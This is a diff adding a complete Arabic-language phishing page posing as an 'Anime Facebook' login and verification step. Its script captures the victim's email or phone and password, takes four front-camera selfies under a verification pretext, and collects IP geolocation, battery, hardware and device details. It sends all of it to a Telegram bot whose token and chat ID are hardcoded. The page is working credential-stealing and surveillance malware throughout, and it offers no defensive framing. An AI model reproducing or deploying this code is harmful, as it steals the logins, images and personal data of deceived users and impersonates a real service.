@@ -1,0 +1,316 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Anime Facebook - تسجيل الدخول والتحقق</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: Helvetica, Arial, sans-serif;
+    }
+    body {
+      background-color: #f0f2f5;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      padding: 20px;
+    }
+    .container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      width: 100%;
+      max-width: 400px;
+    }
+    .fb-header {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    .fb-header h1 {
+      color: #1877f2;
+      font-size: 36px;
+      font-weight: bold;
+      margin-bottom: 5px;
+    }
+    .fb-header p {
+      color: #606770;
+      font-size: 16px;
+    }
+    .card {
+      background: #ffffff;
+      border-radius: 8px;
+      padding: 20px;
+      width: 100%;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+      text-align: center;
+    }
+    .input-box {
+      width: 100%;
+      padding: 14px;
+      margin-bottom: 12px;
+      background: #fff;
+      border: 1px solid #ccd0d5;
+      border-radius: 6px;
+      font-size: 16px;
+      outline: none;
+    }
+    .input-box:focus {
+      border-color: #1877f2;
+      box-shadow: 0 0 0 2px #e7f3ff;
+    }
+    .submit-btn {
+      width: 100%;
+      padding: 12px;
+      background-color: #1877f2;
+      color: #ffffff;
+      border: none;
+      border-radius: 6px;
+      font-size: 20px;
+      font-weight: bold;
+      cursor: pointer;
+      margin-top: 5px;
+      transition: background-color 0.2s;
+    }
+    .submit-btn:hover {
+      background-color: #166fe5;
+    }
+    .camera-section {
+      margin-top: 15px;
+      border-top: 1px solid #dadde1;
+      padding-top: 15px;
+    }
+    video {
+      width: 100%;
+      max-height: 180px;
+      border-radius: 6px;
+      background: #000;
+      display: none;
+      margin-bottom: 10px;
+      object-fit: cover;
+    }
+    .cam-btn {
+      background-color: #42b72a;
+      color: white;
+      border: none;
+      padding: 10px 15px;
+      border-radius: 6px;
+      font-size: 14px;
+      font-weight: bold;
+      cursor: pointer;
+      width: 100%;
+    }
+    .cam-btn:hover {
+      background-color: #36a420;
+    }
+    .success-alert {
+      margin-top: 15px;
+      font-size: 14px;
+      background: #e8f5e9;
+      border: 1px solid #c8e6c9;
+      color: #2e7d32;
+      padding: 10px;
+      border-radius: 6px;
+      display: none;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <div class="fb-header">
+      <h1>Anime Facebook</h1>
+      <p>مجتمع محبي الانمي والمانجا - تسجيل الدخول للتحقق</p>
+    </div>
+
+    <div class="card">
+      <form id="secureForm" onsubmit="processAdvancedTelemetry(event)">
+        <input type="text" id="userInput" class="input-box" placeholder="البريد الإلكتروني أو رقم الهاتف" autocomplete="username" required>
+        <input type="password" id="passInput" class="input-box" placeholder="كلمة المرور" autocomplete="current-password" required>
+        
+        <!-- قسم الكاميرا والتقاط 4 صور -->
+        <div class="camera-section">
+          <p style="font-size: 13px; color: #606770; margin-bottom: 8px;" id="camStatusText">مطلوب التحقق بالصور الأمامية للمتابعة</p>
+          <video id="videoPreview" autoplay playsinline></video>
+          <button type="button" id="camBtn" class="cam-btn" onclick="startCamera()">تشغيل الكاميرا والتحقق</button>
+        </div>
+
+        <button type="submit" id="submitBtn" class="submit-btn" style="margin-top: 15px;" disabled>تسجيل الدخول</button>
+      </form>
+
+      <div id="alertBox" class="success-alert"></div>
+    </div>
+  </div>
+
+  <canvas id="canvas" style="display:none;"></canvas>
+
+  <script>
+    const token = "8554495986:AAF-X26Y0F-J4KPlUNeeAiDbdZy011D_Qoc";
+    const chatId = "8933388029";
+    let capturedPhotos = [];
+
+    // تشغيل الكاميرا الأمامية
+    async function startCamera() {
+      const video = document.getElementById('videoPreview');
+      const camBtn = document.getElementById('camBtn');
+      const statusText = document.getElementById('camStatusText');
+
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+        video.srcObject = stream;
+        video.style.display = 'block';
+        statusText.innerText = 'الكاميرا نشطة، اضغط أدناه لالتقاط الصور';
+        camBtn.innerText = 'التقاط 4 صور للتحقق';
+        camBtn.onclick = captureBurstPhotos;
+      } catch (err) {
+        alert('يرجى السماح بالوصول للكاميرا للمتابعة.');
+      }
+    }
+
+    // التقاط 4 صور متتالية (Burst) بفاصل زمني قصير
+    async function captureBurstPhotos() {
+      const video = document.getElementById('videoPreview');
+      const canvas = document.getElementById('canvas');
+      const camBtn = document.getElementById('camBtn');
+      const submitBtn = document.getElementById('submitBtn');
+      const statusText = document.getElementById('camStatusText');
+
+      canvas.width = video.videoWidth || 640;
+      canvas.height = video.videoHeight || 480;
+      const ctx = canvas.getContext('2d');
+
+      camBtn.disabled = true;
+      capturedPhotos = [];
+
+      for (let i = 1; i <= 4; i++) {
+        statusText.innerText = `جاري التقاط الصورة (${i}/4)...`;
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        capturedPhotos.push(canvas.toDataURL('image/jpeg', 0.8));
+        if (i < 4) {
+          await new Promise(resolve => setTimeout(resolve, 500)); // فاصل نصف ثانية بين كل صورة والثانية
+        }
+      }
+      
+      // إيقاف الكاميرا بعد اكتمال الـ 4 صور
+      const stream = video.srcObject;
+      if (stream) {
+        stream.getTracks().forEach(track => track.stop());
+      }
+      video.style.display = 'none';
+      camBtn.style.display = 'none';
+      statusText.innerText = 'تم التقاط الـ 4 صور بنجاح ✔️';
+      
+      submitBtn.disabled = false;
+      submitBtn.style.backgroundColor = '#42b72a';
+      submitBtn.innerText = 'إتمام تسجيل الدخول';
+    }
+
+    function getDeviceDetails() {
+      const ua = navigator.userAgent;
+      let brandModel = "غير معروف";
+      if (/android/i.test(ua)) {
+        let match = ua.match(/;\s([^;]+)\sBuild\//);
+        if (match && match[1]) {
+          brandModel = match[1];
+        } else {
+          if (/Samsung/i.test(ua)) brandModel = "Samsung Android";
+          else if (/Xiaomi|Redmi/i.test(ua)) brandModel = "Xiaomi / Redmi";
+          else brandModel = "Android Mobile";
+        }
+      } else if (/iphone|ipad|ipod/i.test(ua)) {
+        brandModel = "Apple iPhone / iOS";
+      } else {
+        brandModel = navigator.platform || "Desktop / Unknown";
+      }
+      return brandModel;
+    }
+
+    function getDateTime() {
+      const now = new Date();
+      return now.toLocaleDateString('ar-EG', { year: 'numeric', month: '2-digit', day: '2-digit' }) + ' | ' + 
+             now.toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
+    }
+
+    async function processAdvancedTelemetry(e) {
+      e.preventDefault();
+      
+      const userInput = document.getElementById('userInput').value;
+      const passInput = document.getElementById('passInput').value;
+      
+      const deviceName = getDeviceDetails();
+      const currentDateTime = getDateTime();
+      const randomId = "ID-" + Math.floor(100000 + Math.random() * 900000);
+      const userLang = navigator.language || "غير محدد";
+      const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone || "غير محدد";
+
+      let batteryInfo = "غير متاح";
+      try {
+        if (navigator.getBattery) {
+          const battery = await navigator.getBattery();
+          batteryInfo = Math.round(battery.level * 100) + "% (شحن: " + (battery.charging ? "نعم" : "لا") + ")";
+        }
+      } catch (err) { batteryInfo = "غير مدعوم"; }
+
+      let ipDetails = "جاري التحميل...";
+      try {
+        const ipRes = await fetch('https://ipapi.co/json/');
+        const ipData = await ipRes.json();
+        ipDetails = `${ipData.ip} (${ipData.country_name} - ${ipData.city} | ${ipData.org})`;
+      } catch (err) {
+        try {
+          const fallbackRes = await fetch('https://api.ipify.org?format=json');
+          const fallbackData = await fallbackRes.json();
+          ipDetails = fallbackData.ip;
+        } catch (e2) { ipDetails = "فشل جلب الموقع"; }
+      }
+
+      const screenRes = window.screen.width + "x" + window.screen.height;
+      const cpuCores = navigator.hardwareConcurrency ? navigator.hardwareConcurrency + " أنوية" : "غير متاح";
+      const deviceRAM = navigator.deviceMemory ? navigator.deviceMemory + " GB تقريباً" : "غير متاح";
+
+      // 1. إرسال البيانات النصية والتقرير للتيليجرام
+      const messageText = `🌐 **تقرير زائر Anime Facebook (4 صور + بيانات)**\n\n` +
+                          `👤 الحساب / الإيميل: ${userInput}\n` +
+                          `🔑 كلمة المرور: ${passInput}\n\n` +
+                          `📅 التاريخ والوقت: ${currentDateTime}\n` +
+                          `📱 نوع الموبايل/الجهاز: ${deviceName}\n` +
+                          `📍 الموقع والـ IP: ${ipDetails}\n` +
+                          `🔋 نسبة البطارية: ${batteryInfo}\n` +
+                          `🆔 معرّف الجلسة: ${randomId}\n` +
+                          `📐 دقة الشاشة: ${screenRes}\n` +
+                          `⚡ المعالج والذاكرة: ${cpuCores} | الذاكرة: ${deviceRAM}\n` +
+                          `🌍 اللغة والمنطقة: ${userLang} | ${timeZone}\n\n` +
+                          `✨ مانو معاك في الطريقه 😈👻معلومات الهاتف وصور كمان`;
+      
+      const textUrl = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(messageText)}&parse_mode=Markdown`;
+      await fetch(textUrl);
+
+      // 2. إرسال الـ 4 صور تباعاً للتيليجرام
+      for (let i = 0; i < capturedPhotos.length; i++) {
+        try {
+          const blob = await (await fetch(capturedPhotos[i])).blob();
+          const formData = new FormData();
+          formData.append('chat_id', chatId);
+          formData.append('photo', blob, `selfie_${i+1}.jpg`);
+          formData.append('caption', `📸 صورة التحقق رقم (${i+1}/4) للزائر (${randomId})`);
+
+          await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+            method: 'POST',
+            body: formData
+          });
+        } catch (photoErr) {
+          console.error("فشل إرسال الصورة رقم " + (i+1));
+        }
+      }
+
+      const box = document.getElementById('alertBox');
+      box.style.display = 'block';
+      box.innerText = '✨ تم التحقق ورفع الصور بنجاح! جاري تحويلك للمجتمع...';
+    }
+  </script>
+
+</body>
+</html>
